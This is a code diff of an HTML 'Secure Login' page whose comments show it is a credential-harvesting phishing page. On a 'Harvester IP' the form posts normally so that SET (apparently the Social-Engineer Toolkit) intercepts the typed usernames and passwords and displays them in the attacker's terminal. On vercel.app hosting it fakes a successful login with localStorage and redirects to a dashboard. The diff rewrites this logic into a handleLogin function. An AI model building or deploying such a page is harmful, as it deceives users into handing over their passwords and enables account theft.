@@ -26,20 +26,20 @@
                 Invalid username or password!
             </div>
 
-            <form method="post" action="login.html">
+            <form method="POST" action="/" onsubmit="return handleLogin(event)">
                 <div class="form-group">
                     <label for="username" style="color: var(--text-muted)"><i class="fas fa-user"></i> Username</label>
-                    <input type="text" class="form-control" name="username" id="username" placeholder="Enter your username" required autofocus>
+                    <input type="text" class="form-control" name="username" id="username" placeholder="Username" required autofocus>
                 </div>
                 <div class="form-group">
                     <label for="password" style="color: var(--text-muted)"><i class="fas fa-lock"></i> Password</label>
-                    <input type="password" class="form-control" name="password" id="password" placeholder="••••••••" required>
+                    <input type="password" class="form-control" name="password" id="password" placeholder="Password" required>
                 </div>
                 <div style="display:flex; align-items:center; gap:8px; margin-bottom:24px">
                     <input type="checkbox" id="remember" style="accent-color:var(--accent)">
                     <label for="remember" style="color:var(--text-muted); font-size:0.85rem; margin:0">Keep me logged in</label>
                 </div>
-                <input type="submit" id="submitBtn" value="Secure Login" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
+                <input type="submit" value="Secure Login" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
             </form>
 
             <div style="margin-top:32px; border-top:1px solid rgba(255,255,255,0.1); padding-top:24px; text-align:center; display:flex; justify-content:center; gap:24px">
@@ -50,25 +50,21 @@
     </div>
 
     <script>
-        // Use a more robust bypass that won't interfere with SET
-        document.addEventListener('DOMContentLoaded', function() {
-            const hostname = window.location.hostname;
-            const isVercel = hostname.includes('vercel.app');
-            
-            if (isVercel) {
-                const btn = document.getElementById('submitBtn');
-                if (btn) {
-                    btn.addEventListener('click', function(e) {
-                        e.preventDefault();
-                        localStorage.setItem('loggedin', 'true');
-                        localStorage.setItem('username', document.getElementById('username').value || 'User');
-                        window.location.href = 'pm_dashboard.html';
-                    });
-                }
-            } else {
-                console.log("Environment: Harvester/Local. Form will submit normally.");
+        function handleLogin(e) {
+            // Only bypass the POST request if we are on Vercel
+            if (window.location.hostname.includes('vercel.app')) {
+                e.preventDefault();
+                console.log("Vercel detected: Bypassing POST...");
+                localStorage.setItem('loggedin', 'true');
+                localStorage.setItem('username', document.getElementById('username').value || 'User');
+                window.location.href = 'pm_dashboard.html';
+                return false;
             }
-        });
+            
+            // On Harvester IP: Let the browser POST naturally!
+            // SET will intercept this and display it in your terminal.
+            return true;
+        }
     </script>
 </body>
 </html>
